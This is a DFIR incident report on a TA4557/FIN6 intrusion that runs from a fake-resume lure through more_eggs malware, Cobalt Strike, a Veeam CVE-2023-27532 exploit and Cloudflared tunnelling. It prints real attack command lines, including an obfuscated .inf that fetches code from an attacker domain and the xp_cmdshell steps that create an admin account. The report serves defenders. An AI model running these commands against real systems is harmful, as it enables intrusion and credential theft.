---
title: "The Curious Case of an Egg-Cellent Resume"
source: "https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec"
author:
  - "[[The DFIR Report]]"
published: 2024-12-01
created: 2024-12-18
description: "Key Takeaways Initial access was via a resume lure as part of a TA4557/FIN6 campaign. The threat actor abused LOLbins like ie4uinit.exe and msxsl.exe to run the more_eggs malware. Cobalt Strike and…"
tags:
  - "clippings"
---
## [Key Takeaways](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#key)

- Initial access was via a resume lure as part of a TA4557/FIN6 campaign.
- The threat actor abused LOLbins like ie4uinit.exe and msxsl.exe to run the more\_eggs malware.
- Cobalt Strike and python-based C2 Pyramid were employed by the threat actor for post-exploitation activity.
- The threat actor abused CVE-2023-27532 to exploit a Veeam server and facilitate lateral movement and privilege escalation activities.
- The threat actor installed Cloudflared to assist in tunneling RDP traffic.
- This case was first published as a [Private Threat Brief](https://thedfirreport.com/services/threat-intelligence/#threat-brief) for customers in April of 2024.
- Eight new rules were created from this report and added to our [Private Detection Ruleset](https://thedfirreport.com/services/detection-rules/).

An audio version of this report can be found on [Spotify](https://podcasters.spotify.com/pod/show/the-dfir-report/), [Apple](https://podcasts.apple.com/us/podcast/reports/id1728699064), [YouTube](https://www.youtube.com/@TheDFIRReport/videos), [Audible](https://www.audible.com/pd/Reports-Podcast/B0CSZBRCFX?action_code=ASSGB149080119000H&share_location=pdp), & [Amazon](https://music.amazon.com/podcasts/c4fe897d-a4b4-4ceb-908d-d1a78af8cb6d/reports). 

## [The DFIR Report Services](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#services)

- [Private Threat Briefs](https://thedfirreport.com/services/threat-intelligence/#threat-brief): Over 20 private DFIR reports annually.
- [Threat Feed](https://thedfirreport.com/services/threat-intelligence/#threat-feed): Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.
- [All Intel](https://thedfirreport.com/services/threat-intelligence/#all-intel): Includes everything from Private Threat Briefs and Threat Feed, plus private events, Threat Actor Insights reports, long-term tracking, data clustering, and other curated intel.
- [Private Sigma Ruleset](https://thedfirreport.com/services/detection-rules/): Features 150+ Sigma rules derived from 50+ cases, mapped to ATT&CK with test examples.
- [DFIR Labs](https://thedfirreport.com/services/dfir-labs/): Offers cloud-based, hands-on learning experiences, using real data, from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.

#### Table of Contents:

- [Case Summary](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#case-summary)
- [Services](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#services)
- [Analysts](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#analysts)
- [Initial Access](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#initial-access)
- [Execution](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#execution)
- [Persistence](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#persistence)
- [Privilege Escalation](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#privilege-escalation)
- [Defense Evasion](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#defense-evasion)
- [Credential Access](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#credential-access)
- [Discovery](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#discovery)
- [Lateral Movement](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#lateral-movement)
- [Command and Control](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#command-and-control)
- [Timeline](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#timeline)
- [Diamond Model](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#diamond-model)
- [Indicators](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#indicators)
- [Detections](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#detections)
- [MITRE ATT&CK](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#mitre)

## [Case Summary](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#case-summary)

In March 2024, an investigation took place after malicious activity was detected. Upon analysis, it was identified that a threat actor was able to infect and pivot from a user endpoint to two servers in the environment.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_001.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_001.png)

The threat actor was able to gain access by submitting a job application that pointed to a resume lure. This initial access campaign was observed by Proofpoint who attribute it to the group they track as TA4557. This group has historically overlapped with [FIN6](https://attack.mitre.org/groups/G0037/) activity, and has tooling overlaps with [Cobalt Group](https://attack.mitre.org/groups/G0080/) and [Evilnum](https://attack.mitre.org/groups/G0120/).

After being directed to an online resume site from the job posting notice, the victim downloaded the fake resume zip and executed the malicious .lnk file within the zip. This started an execution flow with the threat actor using the ie4uinit.exe Microsoft executable to side-load a malicious .inf file. After that, the process dropped a malicious DLL which was executed using WMI. This then created a scheduled task, followed by another WMI process to load malicious JScript using the msxsl.exe Microsoft binary. This was the final more\_eggs payload that established beacon activity to the command and control server.

Some initial discovery commands were then run using Microsoft binaries like nltest, net, and whoami. Activity mostly ceased until approximately one and a half days later when Cobalt Strike was dropped on the beachhead. First we observed the threat actor create shadow copies using vssadmin, which we assess was likely for trying to access credentials. This was followed up with some initial discovery using Microsoft utilities and the creation of a new user on the system.

The threat actor then used [SharpShares](https://github.com/djhohnstein/SharpShares) and [Seatbelt](https://github.com/GhostPack/Seatbelt) to further enumerate the host and the environment. The threat actor then attempted to deploy [Pyramid](https://github.com/naksyn/Pyramid) on the beachhead, and while it was executed after much trouble, we observed little action from it or communication to its command and control server. After Pyramid, the threat actor began looking for lateral movement options. They decided to target a backup server running Veeam software. They were able to exploit the vulnerability, CVE-2023-27532, on the server and used the access to create a new local administrator account.

Using the new account on the backup server they used RDP to connect from the beachhead. During this and later RDP pivoting activity, the threat actor leaked several host names that tie to other intrusions that ended with a Fog ransomware deployment, as reported by [Arctic Wolf](https://arcticwolf.com/resources/blog/lost-in-the-fog-a-new-ransomware-threat/). On the backup server the threat actor deployed their Cobalt Strike payload and continued discovery activity with more SharpShares and Seatbelt activity and then AdFind. At this time, on the backup server, LSASS memory was accessed for credentials.

Following this, the threat actor targeted a second server and this time used a remote service to replicate the creation of a new local administrator account on this second server. This service was created using a domain administrator account indicating the previous LSASS access was successful. The threat actor then checked various privileged users in the environment before locating a disabled domain administrator account that they re-enabled.

On the backup server, the threat actor then used the browser to access the file sharing site temp.sh to download a zip file containing a [Cloudflared](https://github.com/cloudflare/cloudflared) installer. The MSI installer in the zip was then run and Cloudflared was installed as a service on the server. They then connected to the second server using RDP and repeated the install process there. On this server, they then created another new user and added them to the local administrator group.

The threat actor then started a new RDP session with the new user and then dropped and executed [SoftPerfect Network Scanner](https://www.softperfect.com/products/networkscanner/). After the scan, the threat actor opened a few files from a remote file share and then activity ceased for the day.

The following day the threat actor returned, pinging a host on a remote network. After this, they then removed the more\_eggs files and persistence task on the beachhead and beaconing to more\_eggs command and control ceased. The Cobalt Strike and Cloudflared tunnels remained active but no further activity was observed before the threat actor was evicted.

Further open-source investigation into the fake resume campaign identified numerous other lure sides with the same templates and images following the same <name>.com format.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_002.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_002.png)

This campaign is still ongoing with minimum changes to the lure websites or malware deployment observed. A list of domains identified are included in the indicators section of the report.

While the more\_eggs malware and fake resume lures have been used by TA4557/FIN6 as early as 2018, this specific campaign appeared to have been established in late 2023. Below includes some previous analysis on the same campaign:

- [Proofpoint](https://www.proofpoint.com/uk/blog/threat-insight/security-brief-ta4557-targets-recruiters-directly-email)
- [Trend Micro](https://www.trendmicro.com/en_us/research/24/i/mdr-in-action--preventing-the-moreeggs-backdoor-from-hatching--.html)
- [eSentire](https://www.esentire.com/blog/more-eggs-activity-persists-via-fake-job-applicant-lures)
- [Critical Start](https://www.criticalstart.com/recruiter-phishing-more-eggs-malware/)

If you would like to get an email when we publish a new report, please subscribe [here](https://thedfirreport.com/subscribe/).

## [Analysts](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#analysts)

Analysis and reporting completed by [@\_pete\_0](https://twitter.com/_pete_0), [Zach Stanford](https://www.linkedin.com/in/zach-stanford-57733296/) (aka [@svch0st](https://twitter.com/svch0st)), and guest contributor [Kelsey Merriman](https://www.linkedin.com/in/kemerriman/) (aka [@k3dg3](https://x.com/k3dg3)) from [Proofpoint](https://x.com/proofpoint)

## [Initial Access](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#initial-access)

Proofpoint has been tracking TA4557 since 2018 as a skilled, financially motivated threat actor known to distribute the exclusive more\_eggs backdoor, which can profile the endpoint and send additional payloads. TA4557 notably differs from other priority threat actors due to the unique tool and malware usage, campaign targeting, job candidate-themed lures, sophisticated evasive measures, distinct attack chains, and notable infrastructure patterns.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_003.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_003.png)

Throughout 2024, Proofpoint has observed TA4557 use multiple delivery approaches when targeting employees involved in the hiring process, including:

- Sending emails directly to employees containing instructions guiding the recipient to navigate to a resume-themed website that ultimately leads to malware delivery. The actor used various methods to prevent security tools from recognizing the domain in the email body, seemingly to avoid automated analysis. Examples include leaving a space or underscore before the TLD in the email body.
- Sending benign emails directly to employees, waiting for a response, then replying with an email containing instructions guiding the recipient to navigate to a resume-themed website that ultimately leads to malware delivery masquerading as a fake candidate and applying to legitimate job postings on various employment websites. The actor typically uploaded a resume to the job application containing instructions that guided users to a fake candidate web page.
- In March 2024, Proofpoint observed the use of the third approach in an email from a job board notifying a user that a new candidate (TA4557) had applied to the user’s open job posting. Our intrusion files and lure site matched this campaign.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_004.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_004.png)

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_005.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_005.png)

In our intrusion, we were able to identify the origin of the malicious payload that was executed by parsing the user’s Edge SQLite databases.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_006.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_006.png)

The user downloaded John Shimkus.zip from the domain johnshimkus\[.\]com. The site had a captcha when the Download CV button was clicked and regenerates a unique download URL when we attempted to analyze the site further.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_007.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_007.png)

When visited from a Linux User Agent, the site returns a basic text resume instead of the download link in an attempt to avoid analysis.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_008.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_008.png)

The same website template and stock image was used in a TA4557 campaign that [Proofpoint covered](https://www.proofpoint.com/au/blog/threat-insight/security-brief-ta4557-targets-recruiters-directly-email) below:

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_009.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_009.png)

## [Execution](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#execution)

Once the victim uncompressed the zip, they clicked the Windows Shortcut file John-\_Shimkus.lnk which executed the infection flow.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_010.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_010.png)

Of note, the image 2.jpg that was alongside the payload in the .zip was not used by the malware. We assess that it was likely used to “pad” the zip in order to decrease detection potential.

Upon execution of the Windows Shortcut, there were several steps of execution that are discussed further below.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_011.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_011.png)

Starting with the .lnk , we were able to parse the file which revealed a long, obfuscated argument.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_012.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_012.png)

After decoding the cmd.exe argument, it becomes the following command, which outputs text to the ieuinit.inf file:

```
(for %%a in ("[089F]" "sc\" "ro%%Clarify%%j,NI,%%Serious%%%%Departments%%%%Departments%%p%%Jaguar%%%%Groups%%%%Groups%%a92837f.johnshimkus.%%Questions%%/setthevar" "[strings]" "Questions=com" "Groups=/" "Clarify=b;Proud" "Jaguar=:;Creatures" "Serious=h" "Danger=%%time%%" "Defines=init" "shortsvcname=' '" "Departments=t;Toast" "servicename=' '" "[destinationdirs]" "defaultdestdir=11" "824=01" "[defaultinstall.windows7]" "Un\" "Register\" "OCXs=089F" "delfiles=824" "[824]" "ieu%%Defines%%.inf" "[version]" "signature$windows nt$" ) do @echo %%~a) > "%%appdata%%\microsoft\ieuinit.inf"
```

And then moves a legitimate copy of the binary, ie4uinit.exe, to a custom location while also setting some additional environment variables.

```
call xcopy /Y /C /Q %%windir%%\system32\ie4uinit.exe "%%appdata%%\microsoft\*" | set Pupils59=Seats && start "" wmic process call create "%%appdata%%\microsoft\ie4uinit.exe -basesettings" | set "Pupils4=Involves Bestsellers Clubs Discussions Crane Acquire Switch Young Estates Advisors Presents Calls Subscriptions Replies Rangers Congress Quote Thesis Makers Gives Folks Quality Vital Posters Paintings Diamond Legend Crucial Installations Across Surplus Double Diabetes Centuries Stadium Unveil Input Segment Databases Disabilities Desert Baskets Ghost Recall Illustrations Pattern Friend Spoon Agents Directories Paperbacks Spike Watches Pilot"
```

This section of commands appeared as follows in the process activity on the beachhead host:

```
%WINDIR%\system32\cmd.exe /S /D /c" call xcopy /Y /C /Q %%windir%%\system32\ie4uinit.exe "%APPDATA%\microsoft\*" "

%WINDIR%\system32\cmd.exe /S /D /c" set Pupils59=Seats "

xcopy /Y /C /Q %WINDIR%\system32\ie4uinit.exe "%APPDATA%\microsoft\*"

%WINDIR%\system32\cmd.exe /S /D /c" start "" wmic process call create "%APPDATA%\microsoft\ie4uinit.exe -basesettings" "

%WINDIR%\system32\cmd.exe /S /D /c" set "Pupils4=Involves Bestsellers Clubs Discussions Crane Acquire Switch Young Estates Advisors Presents Calls Subscriptions Replies Rangers Con
Quote Thesis Makers Gives Folks Quality Vital Posters Paintings Diamond Legend Crucial Installations Across Surplus Double Diabetes Centuries Stadium Unveil Input Segment Databases
Disabilities Desert Baskets Ghost Recall Illustrations Pattern Friend Spoon Agents Directories Paperbacks Spike Watches Pilot""

wmic process call create "%APPDATA%\microsoft\ie4uinit.exe -basesettings"

%APPDATA%\microsoft\ie4uinit.exe -basesetting
```

**Abusing ie4uinit.exe (LOLBin)**

The flow uses a documented execution hijack of IE4uinit.exe ([https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/](https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/)). By supplying a “side-loaded” .inf file to IE4uinit.exe, it can be used to load and execute COM scriptlets (SCT) from remote servers. In this case it was observed to reach out to the URL:

```
hxxp://a92837f.johnshimkus[.]com/setthevar
```

This was visible from the host via a DNS lookup by the ie4uinit.exe process:

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_013.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_013.png)

And with a Suricata rule:

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_014.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_014.png)

We can also use Prefetch to confirm that ie4uinit.exe interacted with the malicious ieuinit.inf:

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_015.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_015.png)

**More\_Eggs**

Shortly after the execution of ie4uinit.exe, the DLL 20350.dll was dropped in the AppData folder. The process wmiprvse.exe then spawned the following command:

```
regsvr32 /s /n /i:Action "C:\Users\<user>\AppData\Roaming\Microsoft\20350.dll"
```

This DLL created .txt files as well as the legitimate MSXSL executable that were used in the next stage of execution:

```
C:\ProgramData\Microsoft\51D7701F6EB775C7.txt (XML - Schtask)
C:\ProgramData\Microsoft\29D88F75006BE8A.txt (XML - more_eggs script)
C:\ProgramData\Microsoft\178F2E426.txt
C:\ProgramData\Microsoft\msxsl.exe (Legitimate Binary)
```

The chain then used schtasks to setup persistence for the more\_eggs malware.

```
schtasks /Create /TN "8766714F94DD" /XML "C:\ProgramData\Microsoft\51D7701F6EB775C7.txt"
```

**Abusing msxsl.exe to deploy more\_eggs**

The more\_eggs payload was finally loaded using the msxsl.exe binary using the documented technique – [https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/](https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/) :

```
C:\ProgramData\Microsoft\msxsl.exe 29D88F75006BE8A.txt 29D88F75006BE8A.txt
```

The file provided to msxsl.exe, 29D88F75006BE8A.txt, was an obfuscated JScript to load the more\_eggs malware.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_016.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_016.png)

After executing, the more\_eggs malware consistently ran the command:

```
typeperf.exe "\System\Processor Queue Length" -si 180 -sc 1
```

Typeperf is a Microsoft utility that is used collect performance data from a specified counter. In this case the Process Queue Length details the threads in the processor. The parameters -si indicates the sample interval in seconds (3 minutes), with -sc indicating the number of samples collected.

The pattern generated approximately 20 new process creation events per hour throughout the duration of the intrusion. This was based on the parameter of 180 seconds, 60 minutes (hour) / 3 minutes (180 seconds) = 20 processes.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_017.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_017.png)

More than one and a half days after initial infection, the threat actor deployed a Cobalt Strike Beacon using regsvr.32.exe:

```
regsvr32.exe /s /n /i "C:\ProgramData\31765.ocx"
```

The .OCX file was an unsigned DLL file, with a size of 230KB.

## [Persistence](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#persistence)

**more\_eggs**

During the initial more\_eggs execution a scheduled task command was run:

```
schtasks /Create /TN "8766714F94DD" /XML "C:\ProgramData\Microsoft\51D7701F6EB775C7.txt"
```

The schtasks command was run with the /XML flag pointing to a text file dropped by the threat actor. This flag according to the [Microsoft documentation](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create):

> Creates a task specified in the XML file. Can be combined with the **/ru** and **/rp** parameters, or with the **/rp** parameter by itself if the XML file already contains the user account information.

So while using a text extension, the file was a ready made task for persistence. The task itself used a Boot Trigger to restart the malware after restart activity on the host.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_018.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_018.png)

The command arguments in the task pointed to a file on disk 178F2E426.txt containing:

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_019.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_019.png)

When decoded we can see the script would result in the execution of msxsl.exe and the more\_eggs script files disguised as text files.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_020.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_020.png)

**Cloudflared**

On a backup server the threat actor downloaded a zip file named cloudflared.zip from the temp.sh file sharing site using Internet Explorer. We can see the internet explorer process write the file and extract the download url from the WebCacheV01.dat file for the user.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_021.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_021.png)

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_022.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_022.png)

The threat actor then installed the tool [Cloudflared](https://github.com/cloudflare/cloudflared) through the MSI installer on two hosts in the environment. Cloudflared is a tool that can be used to tunnel traffic through Cloudflare’s services. This allows the threat actor to proxy access to the private network through the tunnel.

```
"C:\Windows\System32\msiexec.exe" /i "C:\ProgramData\cloudflared\cloudflared-windows-amd64.msi" 
```

| Server | Command Line | Decoded Config (Redacted with Example Text) |
| --- | --- | --- |
| Backup Server | cloudflared-windows-amd64.exe service install eyJ<REDACTED>J9 | {“a”:”ddce269a1e3d054cae349621c198dd52″,”t”:”e8c8cb73-248f-4b39-9cf9-c6fb3b89edb9″,”s”:”AMYNzTjTCQQtlLE5j0ZY4zDYMwxj2wAMZTzQYUOjYZzMh0ty”} |
| An app server | cloudflared.exe service install eyJ<REDACTED>J9 | {“a”:”ddce269a1e3d054cae349621c198dd52″,”t”:”35575e50-eae2-4d40-bcee-5a1986b0df1e”,”s”:”TYWmL3jYjMZMAwN3NMZBU3iMEMZ0mTJztgNhEW1jODMTG0tx”} |

The MSI and subsequent command would install the service (System EID 7045) as Cloudflared agent with the start type of auto start. This would allow persistent access through the tunnel established by the agent.

Installation of the CloudFlared results in Cloudflared Windows Events being logged in the Application log. The events indicating the Cloudflared service starting and the tunnel being established were recorded as Event ID 1 – Cloudflared.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_023.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_023.png)

Followed by tunnel establishment:

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_024.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_024.png)

**Create Accounts**

During the intrusion the threat actor created four different user accounts. Three were local users and added to the host’s local Administrators group with a final user account being added to the domain and domain Administrators group. All of the users were added using net.exe but the commands were initiated via a variety of ways including local command shells, application exploits, and remote services.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_025.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_025.png)

User names observed during the intrusion:

| User | Scope | Host | Execution Method |
| --- | --- | --- | --- |
| backup | local | beachhead | Local cmd spawned from Cobalt Strike |
| sqlbackup | local | backup server | exploit |
| sqlbackup | local | management server | Remote service |
| adm\_1 | domain | management server | Cmd spawned from interactive RDP session |

## [Privilege Escalation](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#privilege-escalation)

 The threat actor then used a modified version of VeeamHax ([https://github.com/sfewer-r7/CVE-2023-27532](https://github.com/sfewer-r7/CVE-2023-27532)). This tool exploited CVE-2023-27532. Below is a side by side of the decompiled version we observed and the source. The main changes were to allow arbitrary SQL commands to be supplied as an argument evaluated on the Veeam target.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_026.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_026.png)

The –cmd argument gets executed through a hard coded xp\_cmdshell command. As seen below, the threat actor stuck to using the default value in the original version of the VeeamHax exploit – c:\\windows\\notepad.exe.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_027.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_027.png)

This ended up being executed on the target SQL server but did not serve any purpose to their goals. The notepad process was used for Proof of Concept purposes. In this execution context, Notepad.exe is considered a harmless process that does not lead to any malicious activity. The –sql argument was the custom addition to the script that would allow arbitrary SQL commands to be passed to the exploit.

The threat actor ran the following commands using their custom version of VeeamHax.exe to enable xp\_cmdshell before creating a local administrator named sqlbackup with the password of Password!1221!.

```
VeeamHax.exe --verbose --target <backup server> --port 9401 --cmd "c:\windows\notepad.exe" --sql "select @@version"
VeeamHax.exe --verbose --target <backup server> --port 9401 --cmd "c:\windows\notepad.exe" --sql "EXEC sp_configure 'show advanced options', '1'"
VeeamHax.exe --verbose --target <backup server> --port 9401 --cmd "c:\windows\notepad.exe" --sql "RECONFIGURE"
VeeamHax.exe --verbose --target <backup server> --port 9401 --cmd "c:\windows\notepad.exe" --sql "EXEC sp_configure 'xp_cmdshell', '1' "
VeeamHax.exe --verbose --target <backup server> --port 9401 --cmd "c:\windows\notepad.exe" --sql "RECONFIGURE"
VeeamHax.exe --verbose --target <backup server> --port 9401 --cmd "c:\windows\notepad.exe" --sql "EXEC master..xp_cmdshell 'net user sqlbackup Password!1221! /add'"
VeeamHax.exe --verbose --target <backup server> --port 9401 --cmd "c:\windows\notepad.exe" --sql "EXEC master..xp_cmdshell 'net localgroup administrators sqlbackup /add'"
```

The VeeamHax.exe binary included the developers Program Database (PDB) string as:

```
E:\Developer\yahtochka\2\CVE-2023-27532\obj\Release\VeeamHax.pdb
```

From the backup server we observed the net commands executed by the MSSQL process.

```
"%WINDIR%\system32\cmd.exe" /c net user sqlbackup Password!1221! /add
"%WINDIR%\system32\cmd.exe" /c net localgroup administrators sqlbackup /add
```

The Security event log recorded the local account creation in Event ID 4720:

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_028.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_028.png)

SQL Server associated Windows Application Event IDs for xp\_cmdshell enable, followed by cmd execution are indicated by two event IDs 15457 in quick succession:

First event relates to enabling xp\_cmdshell:

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_029.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_029.png)

Followed by the xp\_cmdshell execution:

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_030.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_030.png)

**Payload Failures**

While the VeeamHax.exe process executed successfully, the process was observed terminating in the Windows Application Event Log under Event ID 1000 (Provider: Application Error). This indicates that the exploit didn’t safely handle exception errors, resulting in an application crash.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_031.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_031.png)

With an associated ‘.Net Runtime’ error:

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_032.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_032.png)

The attacker was observed executing the process on several occasions, each time several application error events were observed. Resulting in associated Windows Error Reporting Event ID 1001 (Provider: Windows Error Reporting) being generated.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_033.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_033.png)

A WerFault process invoked by an application indicates that the application terminated unexpectedly. There were multiple exploit attempts by the threat actor in a short time frame.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_034.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_034.png)

## [Defense Evasion](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#defense-evasion)

The threat actor removed files and artifacts from hosts throughout the intrusion. For example the more\_eggs payload deleted its own DLL after execution.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_035_1.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_035_1.png)

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_036.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_036.png)

This behavior continued throughout the intrusion.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_037.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_037.png)

During the intrusion, after the threat actor pivoted to a backup server we observed a log event for Windows Defender being disabled. We observed no process event tied to this so we assess that this action was performed by the threat actor in the GUI with their RDP session.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_038.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_038.png)

**Named pipes**

From the Cobalt Strike regsvr32 process we observed usage of default Cobalt Strike named pipes.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_039.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_039.png)

Pipes observed:

```
\postex_18ab
\postex_77cb
```

## [Credential Access](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#credential-access)

During the RDP session on the backup server, the threat actor opened powershell\_ise.exe and ran the script Veeam-Get-Creds.ps1 ([https://github.com/sadshade/veeam-creds/blob/main/Veeam-Get-Creds.ps1](https://github.com/sadshade/veeam-creds/blob/main/Veeam-Get-Creds.ps1)).

The PowerShell operational log with event ID 4103 and 4104 tracked the output of the script which highlighted they successfully extracted an Administrator password from the Veeam database.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_040.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_040.png)

The LSASS process on the backup server was accessed via the RunDll32 (Cobalt Strike) beacon using a well known Granted Access pattern of 0x1010 – PROCESS\_QUERY\_LIMITED\_INFORMATION (0x1000) & PROCESS\_VM\_READ (0x0010)

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_041.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_041.png)

The RunDll32 process was also observed interacting with other processes such as cmd.exe and RunDll32.exe, using SYSTEM, a compromised account domain administrator account and a newly created local account.

**System Recovery**

The use of the Microsoft utility VSSADMIN (Volume Shadow Copy Service) was observed on the beachhead host for listing the configured shadows and then creating a new shadow. It appears that the threat actor had trouble executing the command and repeated the attempt again with an extra ‘cmd’ invocation.

```
C:\Windows\system32\cmd.exe /C vssadmin list shadows
C:\Windows\system32\cmd.exe /C vssadmin create shadow /for=C: 2>&1
C:\Windows\system32\cmd.exe /C vssadmin create shadow
C:\Windows\system32\cmd.exe /C cmd /c vssadmin create shadow /for=C: 2>&1
```

